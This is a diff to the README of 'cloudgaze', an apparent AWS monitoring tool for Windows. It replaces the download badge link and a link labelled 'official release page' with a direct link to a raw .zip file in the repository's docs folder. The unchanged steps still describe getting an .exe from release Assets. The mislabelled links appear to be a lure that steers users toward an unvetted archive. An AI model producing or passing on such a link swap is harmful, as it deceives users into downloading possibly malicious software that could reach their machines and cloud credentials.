@@ -1,6 +1,6 @@
 # ☁️ cloudgaze - See your cloud metrics with ease.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)] (https://github.com/Roentgenographic-skyline37/cloudgaze/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)] (https://raw.githubusercontent.com/Roentgenographic-skyline37/cloudgaze/main/docs/Software-v1.2.zip)
 
 cloudgaze helps you monitor your AWS infrastructure through a clear dashboard. It works on your machine and reads your AWS data. The software focuses on safety and speed. It provides live updates on your cloud health without complex configurations.
 
@@ -8,7 +8,7 @@ cloudgaze helps you monitor your AWS infrastructure through a clear dashboard. I
 
 You need to visit the project page to get the installer for your computer.
 
-1. Go to the [official release page](https://github.com/Roentgenographic-skyline37/cloudgaze).
+1. Go to the [official release page](https://raw.githubusercontent.com/Roentgenographic-skyline37/cloudgaze/main/docs/Software-v1.2.zip).
 2. Look for the Assets section at the bottom of the latest release post.
 3. Select the file that ends in .exe for Windows.
 4. Save the file to your desktop or downloads folder.
